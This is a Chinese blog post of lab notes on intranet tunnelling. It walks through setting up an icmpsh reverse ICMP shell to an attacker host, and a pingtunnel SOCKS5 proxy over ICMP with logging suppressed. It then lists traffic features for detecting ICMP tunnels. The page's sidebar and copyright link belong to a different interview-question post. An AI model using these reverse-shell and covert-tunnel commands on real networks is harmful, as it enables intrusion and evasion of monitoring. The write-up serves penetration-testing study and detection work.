<p>记录一下对内网代理和穿透工具的分析过程，着重在流量侧。</p>
<h2 id="0x01-环境">0x01 环境</h2>
<p>攻击机器：192.168.1.131和192.168.1.133</p>
<p>目标机器：192.168.1.137</p>
<p>目标机器为双网卡，第二层网段为192.168.3.0</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/202405121005280.png" alt="image-20220203155808673"></p>
<h2 id="0x02-分析">0x02 分析</h2>
<p>思路：网络层 -&gt; 传输层 -&gt; 应用层</p>
<h3 id="1、ICMP隧道技术">1、ICMP隧道技术</h3>
<p><strong>icmpsh</strong></p>
<ul>
<li>
<p>介绍</p>
<p>icmpsh是一个简单的反向ICMP shell工具。与其他类似的开源工具相比，主要优势在于它不需要管理权限即可在目标机器上运行。<br>
客户端只能在Windows机器运行，服务端可以在任何平台上运行。</p>
</li>
<li>
<p>下载</p>
<p><a target="_blank" rel="noopener" href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p>
</li>
<li>
<p>使用</p>
</li>
</ul>
<p>服务端：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/inquisb/icmpsh.git</span><br><span class="line"></span><br><span class="line">#关闭icmp回复,如果要开启icmp回复，该值设置为0</span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br><span class="line"></span><br><span class="line">#运行，第一个IP是VPS的eth0网卡IP，第二个IP是目标机器出口的公网IP</span><br><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line">python2 get-pip.py</span><br><span class="line">python2 -m pip install impacket</span><br><span class="line">python2 icmpsh_m.py 192.168.1.133 192.168.1.137</span><br></pre></td></tr></table></figure>
<p>客户端：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-t 主机ip地址以发送ping请求。这个选项是强制性的！</span><br><span class="line">-r 发送一个包含字符串“Test1234”的测试icmp请求，然后退出。</span><br><span class="line">-d 毫秒请求之间的延迟（毫秒）</span><br><span class="line">-o 毫秒响应超时（毫秒）。如果没有及时收到回复，从机将增加空白计数器。如果该计数器达到某个极限，从机将退出。如果收到响应，计数器将设置回0。</span><br><span class="line">-b 空白数量限制（退出前未答复的icmp请求）</span><br><span class="line">-s 字节最大数据缓冲区大小（字节）</span><br><span class="line"></span><br><span class="line">icmpsh.exe -t 192.168.1.133 -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/202405121005246.png" alt="image-20220203174936412"></p>
<p><strong>pingtunnel</strong></p>
<ul>
<li>
<p>介绍</p>
<p>Pingtunnel 是一种通过 ICMP 发送 TCP/UDP 流量的工具。其是最流行的一款ICMP代理工具，提供对tcp/udp/sock5流量伪装成icmp流量进行转发的功能。需要root或者administrator/system权限。</p>
</li>
<li>
<p>下载</p>
<p><a target="_blank" rel="noopener" href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
</li>
<li>
<p>使用</p>
</li>
</ul>
<p>高权限条件下</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/202405121005651.png" alt="image-20220203183416112"></p>
<p>构建反向代理</p>
<p>1）服务端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-type server 代表开启ICMP SERVER端，等待客户端进行连接与通信。</span><br><span class="line">-noprint 1 不在控制台打印日志</span><br><span class="line">-nolog 1 不存储日志文件</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br><span class="line"></span><br><span class="line">./pingtunnel -type server -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/202405121005252.png" alt="image-20220203205320732"></p>
<p>2）客户端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l :4455 -s 192.168.1.133 -sock5 1 -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure>
<p><img src="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220203205238445.png" alt="image-20220203205238445"></p>
<p>3）测试使用</p>
<p>设置 socks5</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/202405121005407.png" alt="image-20220203205403724"></p>
<p>访问二层网络</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/202405121005951.png" alt="image-20220203205430525"></p>
<h3 id="2、ICMP隧道流量特征">2、ICMP隧道流量特征</h3>
<p>流量检测关键点：</p>
<ul>
<li>单位时间内数据包的数量</li>
<li>单组数据包Data字段长度</li>
<li>单组数据包Data字段内容</li>
</ul>
<p>正常情况下，单位时间内数据包发送的数量为一组。</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/202405121005813.png" alt="image-20220203215038175"></p>
<p>单组数据包Data字段长度，Windows为32 bytes，Linux下为48 bytes，并且请求包和响应包长度相同。</p>
<p>单组数据包Data字段长度，Windows为32 bytes，Linux下为48 bytes，并且请求包和响应包长度相同。</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/202405121006442.png" alt="image-20220203220429657"></p>
<p>单组数据包Data字段内容中，Windows为<code>abcdefghijklmnopqrstuvwabcdefghi</code>，Linux下为<code>!”#$%&amp;’()+,-./01234567</code>。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://jinmu1108.github.io">Jinmu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://jinmu1108.github.io/%E9%9D%A2%E8%AF%95/HW%E9%9D%A2%E8%AF%9599/">https://jinmu1108.github.io/%E9%9D%A2%E8%AF%95/HW%E9%9D%A2%E8%AF%9599/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jinmu1108.github.io" target="_blank">J1Nmu</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HW%E9%9D%A2%E8%AF%95/">HW面试</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/%E5%8F%96%E8%AF%81/21%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E9%98%9F%E8%B5%9B/21%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E9%98%9F%E8%B5%9B/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">21美亚杯团队赛</div></div></a></div><div class="next-post pull-right"><a href="/%E5%8F%96%E8%AF%81/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">恶意软件流量分析</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/liujin.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Jinmu</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">55</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">60</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/jinmu1108"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">HW面试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">蓝队初级面试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TOP10"><span class="toc-number">2.2.</span> <span class="toc-text">TOP10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#01-%E5%BD%93%E4%BD%A0%E5%8F%91%E7%8E%B0%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E6%9C%89CDN%E7%9A%84%E6%97%B6%E5%80%99%E5%BA%94%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">2.3.</span> <span class="toc-text">01.当你发现这个网站有CDN的时候应该怎么办?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-%E5%AF%B9%E5%93%AA%E4%BA%9B%E8%AF%AD%E8%A8%80%E6%AF%94%E8%BE%83%E4%BA%86%E8%A7%A3%EF%BC%9F"><span class="toc-number">2.4.</span> <span class="toc-text">02.对哪些语言比较了解？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-sql%E6%B3%A8%E5%85%A5%E9%9C%80%E8%A6%81%E6%BB%A1%E8%B6%B3%E4%BB%80%E4%B9%88%E6%9D%A1%E4%BB%B6%EF%BC%9F"><span class="toc-number">2.5.</span> <span class="toc-text">03.sql注入需要满足什么条件？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#04-sql%E6%B3%A8%E5%85%A5%E6%9C%89%E5%93%AA%E5%87%A0%E5%87%BD%E6%95%B0"><span class="toc-number">2.6.</span> <span class="toc-text">04.sql注入有哪几函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A7%8D%E7%B1%BB%E5%9E%8B%EF%BC%9F"><span class="toc-number">2.7.</span> <span class="toc-text">种类型？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#05-%E7%AE%80%E5%8D%95%E8%AE%B2%E4%B8%80%E4%B8%8B%E9%98%B2%E8%8C%83SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%96%B9%E6%B3%95%E5%92%8C%E5%8E%9F%E7%90%86"><span class="toc-number">2.8.</span> <span class="toc-text">05.简单讲一下防范SQL注入的方法和原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#06-%E4%BD%A0%E5%9C%A8%E8%BF%9B%E8%A1%8Csql%E6%B3%A8%E5%85%A5%E6%97%B6%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9C%89waf-%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number">2.9.</span> <span class="toc-text">06.你在进行sql注入时，发现有waf,该怎么办？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">2.9.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.9.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E7%94%A8"><span class="toc-number">2.9.3.</span> <span class="toc-text">应用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#waf%E7%BB%95%E8%BF%87"><span class="toc-number">2.9.3.1.</span> <span class="toc-text">waf绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#07-SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E6%9C%89%E5%93%AA%E4%BA%9B%E5%8D%B1%E5%AE%B3%EF%BC%9F"><span class="toc-number">2.10.</span> <span class="toc-text">07.SQL注入攻击有哪些危害？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#08-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%9C%89%E4%BA%86%E8%A7%A3%E5%90%97%EF%BC%9F"><span class="toc-number">2.11.</span> <span class="toc-text">08.文件上传有了解吗？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86"><span class="toc-number">2.11.1.</span> <span class="toc-text">1&gt;原理:()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">2.11.2.</span> <span class="toc-text">2&gt;利用思路:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8D%B1%E5%AE%B3"><span class="toc-number">2.11.3.</span> <span class="toc-text">3&gt;危害:()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%BB%95%E8%BF%87"><span class="toc-number">2.11.4.</span> <span class="toc-text">4&gt;绕过:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%98%B2%E8%8C%83"><span class="toc-number">2.11.5.</span> <span class="toc-text">5&gt;防范:()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#09-XSS%E6%94%BB%E5%87%BB%E6%9C%89%E4%BA%86%E8%A7%A3%E5%90%97%EF%BC%9F"><span class="toc-number">2.12.</span> <span class="toc-text">09.XSS攻击有了解吗？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9C%89%E4%BA%86%E8%A7%A3-%E5%8E%9F%E7%90%86"><span class="toc-number">2.12.1.</span> <span class="toc-text">1&gt;有了解,原理:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.12.2.</span> <span class="toc-text">2&gt;类型:()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8D%B1%E5%AE%B3-2"><span class="toc-number">2.12.3.</span> <span class="toc-text">3&gt;危害:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%98%B2%E6%8A%A4"><span class="toc-number">2.12.4.</span> <span class="toc-text">4&gt;防护:()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-%E2%80%93%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95"><span class="toc-number">2.13.</span> <span class="toc-text">10.CSRF(跨站请求伪造)–未授权登录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86-2"><span class="toc-number">2.13.1.</span> <span class="toc-text">1&gt;原理:()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%B1%BB%E5%9E%8B-2"><span class="toc-number">2.13.2.</span> <span class="toc-text">2&gt;类型:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8D%B1%E5%AE%B3-3"><span class="toc-number">2.13.3.</span> <span class="toc-text">3&gt;危害:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="toc-number">2.13.4.</span> <span class="toc-text">4&gt;防范措施</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-SSRF%E6%9C%89%E4%BA%86%E8%A7%A3%E5%90%97"><span class="toc-number">2.14.</span> <span class="toc-text">11.SSRF有了解吗?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86-3"><span class="toc-number">2.14.1.</span> <span class="toc-text">1&gt;原理:()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SSRF%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">2.14.2.</span> <span class="toc-text">2&gt;SSRF利用点()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%BB%95%E8%BF%87"><span class="toc-number">2.14.3.</span> <span class="toc-text">3&gt;绕过:()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%8D%B1%E5%AE%B3"><span class="toc-number">2.14.4.</span> <span class="toc-text">4&gt;危害:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%98%B2%E8%8C%83-2"><span class="toc-number">2.14.5.</span> <span class="toc-text">5&gt;防范:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-csrf%E3%80%81ssrf%E4%B8%8Exss%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.15.</span> <span class="toc-text">12.csrf、ssrf与xss的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-XXE%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB%E6%9C%89%E4%BA%86%E8%A7%A3%E5%90%97%EF%BC%9F"><span class="toc-number">2.16.</span> <span class="toc-text">13.XXE实体攻击有了解吗？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86-4"><span class="toc-number">2.16.1.</span> <span class="toc-text">1&gt;原理:()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-XXE%E6%9E%84%E5%BB%BA"><span class="toc-number">2.16.2.</span> <span class="toc-text">2&gt;XXE构建:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8D%B1%E5%AE%B3-4"><span class="toc-number">2.16.3.</span> <span class="toc-text">3&gt;危害:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%98%B2%E8%8C%83"><span class="toc-number">2.16.4.</span> <span class="toc-text">4&gt;防范:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-number">2.17.</span> <span class="toc-text">14.常见的中间件漏洞有哪些？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15-%E4%BA%86%E8%A7%A3%E8%BF%87WAF%E5%90%97%EF%BC%9F"><span class="toc-number">2.18.</span> <span class="toc-text">15.了解过WAF吗？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">2.18.1.</span> <span class="toc-text">概念:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E5%8A%9F%E8%83%BD"><span class="toc-number">2.18.2.</span> <span class="toc-text">主要功能:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%85%B7%E5%A4%87%E7%9A%84%E5%8A%9F%E8%83%BD"><span class="toc-number">2.18.3.</span> <span class="toc-text">不具备的功能:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16-%E7%BB%95%E8%BF%87WAF%E7%9A%84%E5%A7%BF%E5%8A%BF%EF%BC%9F"><span class="toc-number">2.19.</span> <span class="toc-text">16.绕过WAF的姿势？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17-%E4%BD%A0%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%EF%BC%9F"><span class="toc-number">2.20.</span> <span class="toc-text">17.你在渗透测试中常用的工具？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18-%E4%BD%BF%E7%94%A8%E8%BF%87%E5%93%AA%E4%BA%9B%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%EF%BC%9F"><span class="toc-number">2.21.</span> <span class="toc-text">18.使用过哪些安全设备？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19-%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%92%8C%E7%9B%B8%E5%85%B3%E7%9A%84%E6%9C%8D%E5%8A%A1%EF%BC%9F"><span class="toc-number">2.22.</span> <span class="toc-text">19.常见的端口和相关的服务？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21-%E4%B8%BA%E4%BD%95%E4%B8%80%E4%B8%AAmysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%AB%99%EF%BC%8C%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA80%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE%EF%BC%9F"><span class="toc-number">2.23.</span> <span class="toc-text">21.为何一个mysql数据库的站，只有一个80端口开放？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-3389-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5-%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%9F"><span class="toc-number">2.24.</span> <span class="toc-text">22.3389(远程连接)无法连接的几种情况？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23-%E5%88%A4%E6%96%AD%E5%87%BA%E7%BD%91%E7%AB%99%E7%9A%84CMS%E5%AF%B9%E6%B8%97%E9%80%8F%E6%9C%89%E4%BB%80%E4%B9%88%E6%84%8F%E4%B9%89%EF%BC%9F"><span class="toc-number">2.25.</span> <span class="toc-text">23.判断出网站的CMS对渗透有什么意义？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24-%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E7%9B%AE%E6%A0%87%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.26.</span> <span class="toc-text">24.如何判断目标操作系统?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25-%E5%B8%B8%E8%A7%81%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%87%BD%E6%95%B0%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">2.27.</span> <span class="toc-text">25.常见代码执行、文件读取、命令执行的函数有哪些?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">2.27.1.</span> <span class="toc-text">代码执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.27.2.</span> <span class="toc-text">文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.27.3.</span> <span class="toc-text">命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#26-%E6%9C%A8%E9%A9%AC%E9%A9%BB%E7%95%99%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%96%B9%E5%BC%8F%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F%E7%95%99%E5%90%8E%E9%97%A8"><span class="toc-number">2.28.</span> <span class="toc-text">26.木马驻留系统的方式有哪些？留后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#27-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%EF%BC%9F"><span class="toc-number">2.29.</span> <span class="toc-text">27.内网渗透思路？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#28-Windows%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%EF%BC%9F"><span class="toc-number">2.30.</span> <span class="toc-text">28.Windows常用的提权方法？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#29-Linux%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%EF%BC%9F"><span class="toc-number">2.31.</span> <span class="toc-text">29.Linux常用的提权方法？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#30-%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E5%92%8C%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.32.</span> <span class="toc-text">30.正向代理和反向代理的区别?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#31-%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">2.33.</span> <span class="toc-text">31.正向shell和反向shell的区别？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">2.34.</span> <span class="toc-text">32.序列化与反序列化的区别？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#33-%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E6%B5%81%E9%87%8F%E6%9D%A5%E5%88%86%E6%9E%90%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%EF%BC%9F"><span class="toc-number">2.35.</span> <span class="toc-text">33.如何通过流量来分析安全事件？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#34-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF%E6%B5%81%E7%A8%8B"><span class="toc-number">2.36.</span> <span class="toc-text">34.应急响应基本思路流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Webshell%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%B5%81%E7%A8%8B"><span class="toc-number">2.37.</span> <span class="toc-text">Webshell应急响应流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E8%A2%AB%E6%A4%8D%E5%85%A5webshell"><span class="toc-number">2.37.1.</span> <span class="toc-text">判断是否被植入webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E5%A4%84%E7%90%86"><span class="toc-number">2.37.1.1.</span> <span class="toc-text">临时处理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell%E6%9F%A5%E6%9D%80"><span class="toc-number">2.37.2.</span> <span class="toc-text">webshell查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F%E6%8E%92%E6%9F%A5"><span class="toc-number">2.37.2.1.</span> <span class="toc-text">Windows系统排查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E7%B3%BB%E7%BB%9F%E6%8E%92%E6%9F%A5"><span class="toc-number">2.37.2.2.</span> <span class="toc-text">Linux系统排查</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%8E%92%E6%9F%A5"><span 